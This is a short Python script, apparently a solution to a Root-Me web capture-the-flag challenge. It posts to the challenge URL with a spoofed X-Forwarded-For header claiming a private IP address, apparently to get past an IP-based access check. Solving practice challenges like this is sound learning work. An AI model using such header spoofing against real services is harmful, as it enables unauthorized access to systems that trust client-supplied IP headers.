from email import header
import requests

headers = {'X-Forwarded-For':'192.168.0.1'}
res = requests.post('http://challenge01.root-me.org/web-serveur/ch68/',headers=headers)

print(res.text)